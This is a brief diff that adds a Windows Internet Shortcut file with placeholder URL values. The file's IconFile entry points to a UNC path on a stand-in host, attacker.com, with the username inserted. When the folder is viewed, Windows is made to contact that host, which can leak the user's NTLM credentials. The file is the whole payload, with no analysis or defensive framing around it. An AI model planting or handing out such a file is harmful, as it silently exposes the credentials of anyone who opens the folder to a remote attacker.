@@ -1,0 +1,5 @@
+[InternetShortcut]
+URL=whatever
+WorkingDirectory=whatever
+IconFile=\\attacker.com\webdav\%USERNAME%.icon
+IconIndex=1
